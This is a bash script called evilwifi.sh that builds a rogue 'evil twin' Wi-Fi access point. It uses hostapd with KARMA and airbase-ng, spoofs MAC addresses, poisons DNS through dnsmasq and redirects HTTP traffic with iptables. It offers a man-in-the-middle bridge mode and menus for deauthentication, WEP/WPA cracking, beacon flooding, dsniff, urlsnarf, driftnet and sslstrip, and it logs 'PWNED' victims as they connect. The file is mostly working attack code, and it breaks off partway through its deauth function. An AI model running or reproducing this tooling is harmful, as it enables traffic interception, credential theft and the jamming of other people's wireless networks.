#!/bin/bash
# Hacker Busters - evilwifi.sh             Copyright(c) 2012 Hacker Busters, Inc.
#                                                           All rights Reserved.
# copyright@hackerbusters.ca                            http://hackerbusters.ca
##################################################################################
####################
#  CONFIG SECTION  #
####################
TAPIP=10.0.0.1             #ip address of moniface
NETMASK=255.255.0.0        #subnetmask
WILDCARD=0.0.255.255       #dunno what this is
# =>
# NETWORK=/16
TAPIPBLOCK=10.0.0.0        #subnet
DHCPS=10.0.0.1             #dhcp start range
DHCPE=10.0.255.254         #dhcp end range
BROADCAST=10.0.255.255     #broadcast address
# Hosts/Net 65534          #CLASS C, Private Internet
DHCPL=1h                   #time for dhcp lease
####################
#  OTHER SETTINGS  #
####################
termwidth=130
folder=~/.evilwifi
settings=evilwifi.conf
karma_enabled=1
dnsmasqconf=/etc/dnsmasq.conf
########################################
### IF YOU TOUCH ANYTHING UNDER THIS ### 
### NO SUPPORT WILL BE GIVEN TO YOU  ###
########################################
########################################
###      YOU HAVE BEEN WARNED!!!     ###
###                                  ###
########################################
REVISION=051
#############################
#    UNCOMMENT TO ENABLE    #
#############################
#function customfirewall(){
#iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
#iptables -t nat -A YOURRULEHERE
#iptables -t nat -A YOURRULEHERE
#iptables -t nat -A YOURRULEHERE
#iptables -t nat -A YOURRULEHERE
#}
function banner(){
echo "
######## ##     ## #### ##          ##      ## #### ######## #### 
##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ##  
##       ##     ##  ##  ##          ##  ##  ##  ##  ##        ##  
######   ##     ##  ##  ##          ##  ##  ##  ##  ######    ##  
##        ##   ##   ##  ##          ##  ##  ##  ##  ##        ##  
##         ## ##    ##  ##          ##  ##  ##  ##  ##        ##  
########    ###    #### ########     ###  ###  #### ##       #### 

+-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
|B||Y| |H||A||C||K||E||R| |B||U||S||T||E||R||S| |C||A||N||A||D||A|
+-++-+ +-++-++-++-++-++-+ +-++-++-++-++-++-++-+ +-++-++-++-++-++-+
"
}
OK=`printf "\e[1;32m OK \e[0m"`
FAIL=`printf "\e[1;31mFAIL\e[0m"`
initpath=`pwd`
hostname=$(hostname)
arpaaddr=$(echo $TAPIP|rev)
if [ -d != $folder ]; then mkdir $folder 2> /dev/null; fi
sessionfolder=$folder/SESSION_$RANDOM
mkdir $sessionfolder
mkdir $sessionfolder/logs
mkdir $sessionfolder/pids
mkdir $sessionfolder/pcaps
mkdir $sessionfolder/config
LOG=$sessionfolder/logs/evilwifi.log
MAC=$(awk '/HWaddr/ { print $5 }' < <(ifconfig $ATHIFACE))
if [ -f $settings ]; then echo "[$OK] Config File Found!"; fi
touch $LOG
touch $sessionfolder/logs/missing.log
touch $sessionfolder/config/hostapd.deny
touch $sessionfolder/config/hostapd.allow
function control_c(){
echo ""
echo ""
echo "CTRL+C Was Pressed..."
stopshit
monitormodestop
cleanup
exit 0
}
trap control_c INT
####################
# INTERNET TESTING #
####################
function pinginternet(){
INTERNETTEST=$(awk '/bytes from/ { print $1 }' < <(ping 8.8.8.8 -c 1 -w 3))
if [ "$INTERNETTEST" = "64" ]; then INTERNET=TRUE; else INTERNET=FALSE; fi
}
function dnscheck(){
DNSCHECK=$(awk '/bytes from/ { print $1 }' < <(ping raw.github.com -c 1 -w 3))
if [ "$DNSCHECK" = "64" ]; then DNS=TRUE; else DNS=FALSE; fi
}
function pinggateway(){
GATEWAYRDNS=$(awk '/br-lan/ && /UG/ {print $2}' < <(route))
GATEWAY=$(awk '/br-lan/ && /UG/ { print $2 }' < <(route -n))
echo "Pinging $GATEWAYRDNS [$GATEWAY] with 64 bytes of data:"
GATEWAYTEST=$(awk '/bytes from/ { print $1 }' < <(ping $GATEWAY -c 1 -w 3))
if [ "$GATEWAYTEST" = "64" ]; then echo "Reply from $GATEWAY: bytes=64"; else echo "Request timed out."; fi
}
function pingvictim(){
echo "Pinging $VICTIMRDNS [$VICTIM] with 64 bytes of data:"
ping $VICTIM -c 20 -W 1 | awk '/bytes from/ { print $5 }'
}
function checkupdate(){
echo "+===================================+"
echo "| RUNNING SCRIPT UPDATE CHECK       |"
echo "+===================================+"
newrevision=$(curl -s -B -L https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/VERSION)
if [ "$newrevision" -gt "$REVISION" ]; then update;
else
echo ""
echo "#####################################"
echo "# NO UPDATE IS REQUIRED             #"
echo "#####################################";
fi
}
function update(){
echo ""
echo "#####################################"
echo "# ATTEMPTING TO DOWNLOAD UPDATE     #"
echo "#####################################"
wget -nv -t 1 -T 10 -O evilwifi.sh.tmp https://raw.github.com/CanadianJeff/BackTrack-5-Scripts/master/evilwifi.sh
if [ -f evilwifi.sh.tmp ]; then rm evilwifi.sh; mv evilwifi.sh.tmp evilwifi.sh;
echo "CHMOD & EXIT"
chmod 755 evilwifi.sh
read -e -p "Update [$OK] " enter
exit 0
else
echo "Update [$FAIL]..."
read -e -p "Try Again? " enter
update
fi
}
######################
# DEPENDENCY SECTION #
######################
function installdeps(){
installaircrack
installhostapd
installlighttpd
}
function uninstallaircrack(){
if [ -d "/usr/src/aircrack-ng" ]; then 
cd /usr/src/aircrack-ng;
make uninstall && make clean; fi
cd $initpath
}
function installaircrack(){
uninstallaircrack
cd /usr/src
rm -rfv aircrack-ng*;
svn co http://trac.aircrack-ng.org/svn/trunk/ aircrack-ng
cd aircrack-ng
make && make install
cd $initpath
}
function uninstallhostapd(){
if [ -d "/usr/src/hostapd-1.0-karma" ]; then 
cd /usr/src/hostapd-1.0-karma/hostapd;
make clean;
cd /usr/src
rm -rfv hostapd*
cd $initpath
fi
}
function installhostapd(){
uninstallhostapd
cd /usr/src
wget -nv -t 1 -T 10 http://www.digininja.org/files/hostapd-1.0-karma.tar.bz2
tar -xvf hostapd-1.0-karma.tar.bz2
cd hostapd-1.0-karma
cd hostapd
make && make install
cd $initpath
}
function installlighttpd(){
apt-get install lighttpd
}
####################
# PIDS AND CLEANUP #
####################
function pspids(){
pgrep airbase-ng > $sessionfolder/pids/airbase-ng.pid
pgrep dnsmasq > $sessionfolder/pids/dnsmasq.pid
pgrep hostapd > $sessionfolder/pids/hostapd.pid
pgrep dumpcap > $sessionfolder/pids/dumpcap.pid
pgrep wireshark > $sessionfolder/pids/wireshark.pid
}
function stopshit(){
pspids
service apache2 stop &>$LOG
service dhcp3-server stop &>$LOG
while [ -s $sessionfolder/pids/airbase-ng.pid ]; do
sleep 2
pspids
echo "Killing Airbase-NG"
kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/airbase-ng.pid)` &>/dev/null
done
while [ -s $sessionfolder/pids/hostapd.pid ]; do
sleep 2
pspids
echo "Killing Hostapd"
kill -9 `awk '{ print $1 }' < <(cat $sessionfolder/pids/hostapd.pid)` &>/dev/null
airmon-ng stop mon.$TAPIFACE &>/dev/null
done
while [ -s $sessionfolder/pids/dnsmasq.pid ]; do
sleep 2
pspids
echo "Killing DNSMASQ"
kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dnsmasq.pid)` &>/dev/null
done
while [ -s $sessionfolder/pids/dumpcap.pid ]; do
sleep 2
pspids
echo "Killing DUMPCAP"
kill `awk '{ print $1 }' < <(cat $sessionfolder/pids/dumpcap.pid)` &>/dev/null
done
for pid in `ls $sessionfolder/pids/*.pid 2>$LOG`; do if [ -s "$pid" ]; then
kill `cat $sessionfolder/pids/probe.pid 2>$LOG` &>/dev/null
kill `cat $sessionfolder/pids/pwned.pid 2>$LOG` &>/dev/null
kill `cat $sessionfolder/pids/web.pid 2>$LOG` &>/dev/null
kill `cat $pid 2>$LOG` &>/dev/null
fi; done
if [ -f /var/run/dhcpd/$TAPIFACE.pid ]; then
kill `cat /var/run/dhcpd/$TAPIFACE.pid 2>$LOG` &>/dev/null;
fi
killall -9 airodump-ng aireplay-ng mdk3 driftnet urlsnarf dsniff &>/dev/null
firewallreset
ifconfig $ATHIFACE down
ifconfig $TAPIFACE down
}
function cleanup(){
dhcpconf=/etc/dhcp3/dhcpd.conf
echo > $dhcpconf
echo > $dnsmasqconf
mv $APACHECONF/default~ $APACHECONF/default
}
###################
# CONF FILE MAKER #
###################
function settings(){
echo ""
echo "+===================================+"
echo "| Listing Wireless Devices          |"
echo "+===================================+"
airmon-ng | awk '/phy/ {print $1}'
echo "+===================================+"
echo ""
echo "Pressing Enter Uses Default Settings"
echo ""
read -e -p "RF Moniter Interface [wlan0]: " ATHIFACE
if [ "$ATHIFACE" = "" ]; then ATHIFACE=wlan0; fi
ifconfig $ATHIFACE up
MAC=$(ifconfig $ATHIFACE | awk '/HWaddr/ { print $5 }')
read -e -p "Spoof MAC Addres For $ATHIFACE [$MAC]: " SPOOFMAC
read -e -p "What SSID Do You Want To Use [WiFi]: " ESSID
if [ "$ESSID" = "" ]; then ESSID=WiFi; fi
read -e -p "What CHANNEL Do You Want To Use [1]: " CHAN
if [ "$CHAN" = "" ]; then CHAN=1; fi
read -e -p "Select your MTU setting [7981]: " MTU
if [ "$MTU" = "" ]; then MTU=7981; fi
if [ "$MODE" = "4" ]; then 
read -e -p "Targets MAC Address: " TARGETMAC
fi
read -e -p "Beacon Intervals [50]: " BEAINT
if [ "$BEAINT" = "" ]; then BEAINT=50; fi
if [ "$BEAINT" -lt "10" ]; then BEAINT=50; fi
read -e -p "Packets Per Second [100]: " PPS
if [ "$PPS" = "" ]; then PPS=100; fi
if [ "$PPS" -lt "100" ]; then PPS=100; fi
read -e -p "Other AirBase-NG Options [none]: " OTHEROPTS
read -e -p "DNS Spoof What Website [#]: " DNSURL
if [ "$DNSURL" = "" ]; then DNSURL=\#; fi
echo ""
}
######################
# CONF FILES SECTION #
######################
function hostapdconfig(){
hostapdconf=$sessionfolder/config/hostapd.conf
TAPIFACE=$ATHIFACE
echo "driver=nl80211" > $hostapdconf
echo "enable_karma=$karma_enabled" >> $hostapdconf
echo "karma_black_white=1" >> $hostapdconf
echo "interface=$TAPIFACE" >> $hostapdconf
echo "logger_syslog=-1" >> $hostapdconf
echo "logger_syslog_level=2" >> $hostapdconf
echo "logger_stdout=-1" >> $hostapdconf
echo "logger_stdout=2" >> $hostapdconf
echo "dump_file=$sessionfolder/logs/hostapd.dump" >> $hostapdconf
echo "ctrl_interface=/var/run/hostapd" >> $hostapdconf
echo "ctrl_interface_group=0" >> $hostapdconf
echo "ssid=$ESSID" >> $hostapdconf
echo "hw_mode=g" >> $hostapdconf
echo "channel=$CHAN" >> $hostapdconf
echo "beacon_int=$BEAINT" >> $hostapdconf
echo "dtim_period=2" >> $hostapdconf
echo "max_num_sta=2000" >> $hostapdconf
echo "rts_threshold=2347" >> $hostapdconf
echo "fragm_threshold=2346" >> $hostapdconf
echo "macaddr_acl=0" >> $hostapdconf
echo "accept_mac_file=$sessionfolder/config/hostapd.accept" >> $hostapdconf
echo "deny_mac_file=$sessionfolder/config/hostapd.deny" >> $hostapdconf
echo "auth_algs=3" >> $hostapdconf
echo "ignore_broadcast_ssid=0" >> $hostapdconf
#echo "wep_default_key=0" >> $hostapdconf
#echo "wep_key0=123456789a" >> $hostapdconf
echo "ap_max_inactivity=300" >> $hostapdconf
echo "disassoc_low_ack=1" >> $hostapdconf
#echo "ap_isolate=1" >> $hostapdconf
#echo "ieee80211n=1" >> $hostapdconf
#echo "access_network_type=0" >> $hostapdconf
}
function dhcpd3config(){
echo "* DHCPD3 SERVER!!! *"
replace INTERFACES=\"\" INTERFACES=\"$TAPIFACE\" -- /etc/default/dhcp3-server
echo "" > /var/lib/dhcp3/dhcpd.leases
mkdir -p /var/run/dhcpd && chown dhcpd.dhcpd /var/run/dhcpd;
dhcpconf=/etc/dhcp3/dhcpd.conf
echo "ddns-update-style none;" > $dhcpconf
echo "default-lease-time 600;" >> $dhcpconf
echo "max-lease-time 7200;" >> $dhcpconf
echo "" >> $dhcpconf
echo "log-facility local7;" >> $dhcpconf
#echo "local7.* $folder/dhcpd.log" > /etc/rsyslog.d/dhcpd.conf
echo "" >> $dhcpconf
echo "authoritative;" >> $dhcpconf
echo "" >> $dhcpconf
# echo "shared-network NetworkName {" >> $dhcpconf
echo "subnet $TAPIPBLOCK netmask $NETMASK {" >> $dhcpconf
# echo "option subnet-mask $NETMASK;" >> $dhcpconf
# echo "option broadcast-address $BROADCAST;" >> $dhcpconf
echo "option domain-name backtrack-linux;" >> $dhcpconf
echo "option domain-name-servers $TAPIP;" >> $dhcpconf
echo "option routers $TAPIP;" >> $dhcpconf
echo "range $DHCPS $DHCPE;" >> $dhcpconf
echo "allow unknown-clients;" >> $dhcpconf
echo "one-lease-per-client false;" >> $dhcpconf
echo "}" >> $dhcpconf
# echo "}" >> $dhcpconf
dhcpdserver
}
function dnsmasqconfig(){
echo "# auto-generated config file from evilwifi.sh" > $dnsmasqconf
# echo "conf-file=/etc/dnsmasq.conf" >> $dnsmasqconf
echo "address=/$DNSURL/$TAPIP" >> $dnsmasqconf
# echo "ptr-record=$arpaaddr.in-addr.arpa,$hostname.wirelesslan" >> $dnsmasqconf
echo "dhcp-authoritative" >> $dnsmasqconf
echo "dhcp-lease-max=102" >> $dnsmasqconf
echo "domain-needed" >> $dnsmasqconf
echo "domain=wirelesslan" >> $dnsmasqconf
echo "server=/wirelesslan/" >> $dnsmasqconf
echo "localise-queries" >> $dnsmasqconf
echo "log-queries" >> $dnsmasqconf
echo "log-dhcp" >> $dnsmasqconf
# echo "read-ethers" >> $dnsmasqconf
# echo "bogus-priv" >> $dnsmasqconf
# echo "expand-hosts" >> $dnsmasqconf
echo "" >> $dnsmasqconf
# echo "interface=$TAPIFACE" >> $dnsmasqconf
echo "dhcp-leasefile=$sessionfolder/dnsmasq.leases" >> $dnsmasqconf
echo "resolv-file=$sessionfolder/resolv.conf.auto" >> $dnsmasqconf
echo "stop-dns-rebind" >> $dnsmasqconf
# echo "rebind-localhost-ok" >> $dnsmasqconf
echo "dhcp-range=wirelesslan,$DHCPS,$DHCPE,$NETMASK,$DHCPL" >> $dnsmasqconf
echo "dhcp-option=wirelesslan,3,$TAPIP" >> $dnsmasqconf
# echo "dhcp-option=wirelesslan,3," >> $dnsmasqconf
echo "dhcp-host=$MAC,$TAPIP" >> $dnsmasqconf
echo "nameserver $TAPIP" > $sessionfolder/resolv.conf.auto
if [ "$mode" = "1" ]; then startdnsmasq; fi
if [ "$mode" = "2" ]; then startdnsmasqresolv; fi
}
function lighttpdconfig(){
echo "docroot=/var/www" > /etc/lighttpd.conf
echo "" >> /etc/lighttpd.conf
echo "server.modules              = (" >> /etc/lighttpd.conf
echo " \"mod_access\"," >> /etc/lighttpd.conf
echo " \"mod_alias\"," >> /etc/lighttpd.conf
echo " \"mod_accesslog\"," >> /etc/lighttpd.conf
echo " \"mod_rewrite\"" >> /etc/lighttpd.conf
echo ")" >> /etc/lighttpd.conf
echo "" >> /etc/lighttpd.conf
echo "server.document-root = \"$docroot/evilwifi\"" >> /etc/lighttpd.conf
echo "server.upload-dirs = ( \"/var/cache/lighttpd/uploads\" )" >> /etc/lighttpd.conf
echo "server.errorlog = \"$sessionfolder/logs/lighttpd/error.log\"" >> /etc/lighttpd.conf
echo "accesslog.filename = \"$sessionfolder/logs/lighttpd/access.log\"" >> /etc/lighttpd.conf
echo "index-file.names = ( \"index.php\" )" >> /etc/lighttpd.conf
echo "# url.access-deny = ( \"~\", \".inc\" )" >> /etc/lighttpd.conf
echo "static-file.exclude-extensions = ( \".php\", \".pl\", \".fcgi\" )" >> /etc/lighttpd.conf
echo "server.port = 31337" >> /etc/lighttpd.conf
echo "# server.bind = \"localhost\"" >> /etc/lighttpd.conf
echo "server.pid-file = \"$sessionfolder/pids/lighttpd.pid\"" >> /etc/lighttpd.conf
echo "server.dir-listing = \"disable\"" >> /etc/lighttpd.conf
echo "# server.chroot = \"/\"" >> /etc/lighttpd.conf
echo "# server.username = \"root\"" >> /etc/lighttpd.conf
echo "# server.groupname = \"root\"" >> /etc/lighttpd.conf
}
####################
# FIREWALL RELATED #
####################
function firewallreset(){
iptables --flush
iptables --table nat --flush
iptables --table mangle --flush
iptables -X
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table mangle --delete-chain
echo "0" > /proc/sys/net/ipv4/ip_forward
}
function firewall(){
iptables -P FORWARD ACCEPT
iptables -P INPUT ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
#customfirewall
echo "1" > /proc/sys/net/ipv4/ip_forward
}
function firewallbrlan(){
iptables -t nat -A POSTROUTING -o br-lan -j MASQUERADE
}
function firewallportal(){
iptables -t mangle -N internet
iptables -t mangle -A PREROUTING -i $TAPIFACE -p tcp -m tcp --dport 80 -j internet
iptables -t mangle -A internet -j MARK --set-mark 99
iptables -t nat -A PREROUTING -i $TAPIFACE -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination $TAPIP
}
function firewalltesting(){
iptables -A FORWARD -i $TAPIFACE -j ACCEPT
#iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $TAPIP:53
#iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $TAPIP:53
#iptables -t nat -A PREROUTING -p tcp --dport 67 -j DNAT --to-destination $TAPIP:67
#iptables -t nat -A PREROUTING -p udp --dport 67 -j DNAT --to-destination $TAPIP:67
#iptables -t nat -A PREROUTING -p tcp --dport 68 -j DNAT --to-destination $TAPIP:68
#iptables -t nat -A PREROUTING -p udp --dport 68 -j DNAT --to-destination $TAPIP:68
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $TAPIP:80
#iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $TAPIP:443
#iptables -t nat -A POSTROUTING -o $TAPIFACE -j MASQUERADE
}
#####################
# STARTING SERVICES #
#####################
function starthostapd(){
echo "* STARTING SERVICE: HOSTAPD *"
hostapd -dd -f $sessionfolder/logs/hostapd.log -P $sessionfolder/pids/hostapd.pid $folder/hostapd.conf -B
sleep 20
}
function startairbase(){
echo "* STARTING SERVICE: AIRBASE-NG *"
airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT -e "$ESSID" $OTHEROPTS $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
}
function startdnsmasq(){
echo "no-poll" >> /etc/dnsmasq.conf
echo "no-resolv" >> /etc/dnsmasq.conf
echo "* DNSMASQ DNS POISON!!! *"
gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
"dnsmasq --no-daemon --interface=$TAPIFACE --except-interface=lo -C /etc/dnsmasq.conf"
}
function startdnsmasqresolv(){
echo "dhcp-option=wirelesslan,6,$TAPIP,8.8.8.8" >> /etc/dnsmasq.conf
echo "* DNSMASQ With Internet *"
gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
"dnsmasq --no-daemon --interface=$TAPIFACE --except-interface=lo -C /etc/dnsmasq.conf"
}
function udhcpdserver(){
gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
"udhcpd"
}
function dhcpdserver(){
gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
"dhcpd3 -d -f -cf $dhcpconf -pf /var/run/dhcpd/$TAPIFACE.pid $TAPIFACE"
}
function nodhcpserver(){
echo "* Not Using A Local DHCP Server *"
}
function apachesetup(){
APACHECONF=/etc/apache2/sites-available
if [ -f $APACHECONF/default~ ]; then cp $APACHECONF/default~ $APACHECONF/default;
else cp $APACHECONF/default $APACHECONF/default~; fi
sed -n "s/AllowOverride None/AllowOverride All/g" $APACHECONF/default
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
ln -s /var/log/apache2/access.log $sessionfolder/logs/access.log
ln -s /var/log/apache2/error.log $sessionfolder/logs/error.log
}
function apachecheck(){
apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
if [[ -z $apache ]]; then
echo "* Starting Apache2 Web Server *"
/etc/init.d/apache2 start
sleep 2
apache=$(ps aux|grep "/usr/sbin/apache2"|grep www-data)
if [[ -z $apache ]]; then
echo "* Apache Failed To Start Skipping... *"
sleep 4
else
echo "* Apache2 Web Server Started *"
fi
else
echo "Apache2 Was Already Running"
fi
}
#############################
# SHELL SCRIPT VERBOSE MODE #
#############################
function taillogshostapd(){
echo > /var/log/syslog
# for (i=9; i<=NF; i++)
echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
#echo "cur_time=$(awk '// {print $4}' < <(date))" >> $folder/probe.sh
echo "awk '/Probe/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", strftime(\"%H:%M:%S\"), \$5, \$8, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/hostapd.log)" >> $folder/probe.sh
echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
echo "awk '/AP-STA-CONNECTED/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: \n\", strftime(\"%H:%M:%S\"), \$3)}' < <(tail -f $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
echo "awk '/DHCPACK/ && /$TAPIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
chmod a+x $folder/probe.sh
chmod a+x $folder/pwned.sh
chmod a+x $folder/web.sh
gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
#VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
#VICTIMIP=
#VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
#gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
#"tail -f $sessionfolder/error.log"
}
function taillogsairbase(){
echo > /var/log/syslog
# for (i=9; i<=NF; i++)
echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/airbaseng.log)" >> $folder/probe.sh
echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $sessionfolder/logs/airbaseng.log) &" >> $folder/pwned.sh
echo "awk '/DHCPACK/ && /$TAPIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f /var/log/syslog)" >> $folder/pwned.sh
echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
chmod a+x $folder/probe.sh
chmod a+x $folder/pwned.sh
chmod a+x $folder/web.sh
gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=WEB -e "/bin/bash $folder/web.sh"
gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PWNED -e "/bin/bash $folder/pwned.sh"
gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PROBE -e "/bin/bash $folder/probe.sh"
#VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
#VICTIMIP=
#VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
#gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title="APACHE2 ERROR.LOG" -e \
#"tail -f $sessionfolder/error.log"
}
##########################
# INTERFACE PREP SECTION #
##########################
function brlan(){
brctl addbr br-lan
brctl addif br-lan $TAPIFACE
brctl addif br-lan $LANIFACE
ifconfig $TAPIFACE 0.0.0.0 up
ifconfig $LANIFACE 0.0.0.0 up
ifconfig br-lan up
iptables -A FORWARD -i br-lan -j ACCEPT
echo ""
echo "* ATTEMPTING TO BRIDGE ON $LANIFACE (br-lan) *"
dhclient3 br-lan &>$sessionfolder/logs/bridge.log
BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $sessionfolder/logs/bridge.log))
while [ "$BRLANDHCP" = "No" ]; do
echo ""
echo "* [$FAIL] No DHCP Server Found On $LANIFACE (br-lan) *"
rm $sessionfolder/logs/bridge.log
brlandown
sleep 2
brlan
done
echo ""
pinggateway
}
function brlandown(){
ifconfig br-lan down
brctl delbr br-lan
}
function monitormodestop(){
echo ""
echo "* ATTEMPTING TO STOP MONITOR-MODE *"
if [ "$ATHIFACE" = "" ]; then 
ATHIFACE=`ifconfig wlan | awk '/encap/ {print $1}'`
fi
if [ "$MONIFACE" = "" ]; then
MONIFACE=mon0
fi
airmon-ng stop $ATHIFACE &>/dev/null;
airmon-ng stop $MONIFACE &>/dev/null;
ifconfig $ATHIFACE down
sleep 2
}
function monitormodestart(){
airmon-ng check kill > $sessionfolder/logs/monitormodepslist.log
echo "* ATTEMPTING TO START MONITOR-MODE ($ATHIFACE) *"
airmon-ng start $ATHIFACE $CHAN > $sessionfolder/logs/monitormode.log
MONIFACE=`awk '/enabled/ { print $5 }' $sessionfolder/logs/monitormode.log | head -c -2`
if [ "$SPOOFMAC" != "" ]; then
macchanger -m $SPOOFMAC $MONIFACE
fi
if [ "$MONIFACE" != "" ]; then
echo ""
echo "* [$OK] MONITOR MODE ENABLED ON ($MONIFACE) *"
echo "";
else
echo ""
echo "* [$FAIL] COULD NOT ENABLE MONITOR MODE ON ($ATHIFACE) *"
echo "IF YOU THINK THIS IS AN ERROR PLEASE REPORT IT TO"
echo "THE SCRIPT AUTHOR OR CHECK IF YOUR CARD IS SUPPORTED"
echo ""
sleep 9999; fi
}
######################
# SHELL SCRIPT MENUS #
######################
function internetmenu(){
echo "+===================================+"
echo "| Internet Detected :-)             |"
echo "+===================================+"
echo "| 1) Install Missing Depends         "
echo "| 2) Update Depends                  "
echo "| 3) Force Update Script             "
echo "| 4) Run Script                      "
echo "+===================================+"
echo ""
read -e -p "Option: " internetmenu
echo ""
if [ "$internetmenu" = "" ]; then clear; internetmenu; fi
}
function poisonmenu(){
echo "+===================================+"
echo "| Choose You're Poison?             |"
echo "+===================================+"
echo "| 1) Attack Mode | *DEFAULT*         "
echo "| 2) Bridge Mode | Man In The Middle "
echo "| 3) WEP/WPA Hack | AutoPwn          "
echo "| 4) Beacon Flood | Fake AP Flood    "
echo "| 5) Deauth Mode | Boot People Off   "
echo "| ********************************** "
echo "|     CTRL + C QUITS AT ANYTIME      "
echo "+===================================+"
echo ""
read -e -p "Option: " mode
echo ""
if [ "$mode" = "" ]; then clear; poisonmenu; fi
}
function softapmenu(){
echo "+===================================+"
echo "| Which AP Software?                |"
echo "+===================================+"
echo "| 0) Airbase-NG All Probes           "
echo "| 1) HOSTAPD w KARMA                 "
echo "+===================================+"
echo ""
read -e -p "Option: " softap
echo ""
if [ "$softap" = "" ]; then clear; softapmenu; fi
}
function dhcpmenu(){
echo "+===================================+"
echo "| DHCP SERVER MENU                  |"
echo "+===================================+"
echo "| 1) DNSMASQ"
echo "| 2) DHCPD3-SERVER"
echo "| 3) UDHCPD"
echo "| 4) MitM No DHCP Server Use This"
echo "+===================================+"
echo ""
read -e -p "Option: " DHCPSERVER
echo ""
if [ "$DHCPSERVER" = "" ]; then clear; dhcpmenu; fi
}
function attackmenu(){
clear
echo "+===================================+"
echo "| MAIN ATTACK MENU                  |"
echo "+===================================+"
echo "| 1) Deauth"
echo "| 2) Wireshark"
echo "| 3) DSniff"
echo "| 4) URLSnarf"
echo "| 5) Driftnet"
echo "| 6) SSLStrip"
echo "| 7) Beacon Flood (WIFI JAMMER)"
echo "| 8) Exit and leave everything running"
echo "| 9) Exit and cleanup"
echo "+===================================+"
echo ""
read -e -p "Option: " attack
if [ "$attack" = "" ]; then clear; attackmenu; fi
}
###################
# DEAUTH GOODNESS #
###################
function deauth(){
echo ""
echo "+===================================+"
echo "| SCANNING NEARBY WIFIS             |"
echo "+===================================+"
